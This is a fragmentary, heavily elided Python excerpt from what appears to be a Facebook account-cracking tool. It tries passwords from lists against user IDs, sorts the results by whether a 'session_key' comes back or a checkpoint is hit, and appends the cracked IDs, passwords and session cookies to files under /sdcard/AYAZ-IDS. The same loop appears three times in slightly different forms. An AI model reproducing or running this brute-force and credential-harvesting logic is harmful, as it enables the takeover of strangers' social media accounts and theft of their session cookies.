            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    if "yes" in scoki:
                        ...
                        open('/sdcard/AYAZ-IDS/UID-OK.txt','a').write(iid+'|'+pas+'|'+coki+'\n')
                        ok.append(iid)
                        break
                    else:
                    ...
                    open('/sdcard/AYAZ-IDS/file-cp.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
            ...
            for pw in passlist:
                ...
                if 'session_key' in po:
                    if "yes" in scoki:
                        ...
                        print(f'\r{G} [OK] '+iid+' | '+pas+'\033[0;97m')
                        open('/sdcard/AYAZ-IDS/UID-OK.txt','a').write(iid+'|'+pas+'\n')
                        ok.append(iid)
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    open('/sdcard/AYAZ-IDS/UID-CP.txt','a').write(iid+'|'+pas+'\n')
                    cp.append(iid)
                else:
                    continue
            loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/AYAZ-IDS/UID-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/AYAZ-IDS/UID-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
